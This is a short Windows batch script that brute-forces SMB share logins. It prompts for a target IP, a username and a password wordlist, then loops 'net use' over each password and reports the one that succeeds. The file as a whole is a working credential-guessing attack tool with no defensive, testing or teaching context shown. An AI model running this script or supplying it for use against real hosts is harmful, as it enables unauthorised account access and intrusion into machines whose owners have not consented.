@echo off
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

for /f %%a in (%wordlist%) do (
   set pass=%%a
   call :attempt
)
echo Password not Found
pause
exit

:success
echo Password Found!: %pass%
net use \\%ip% /d /y
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% EQU 0 goto success
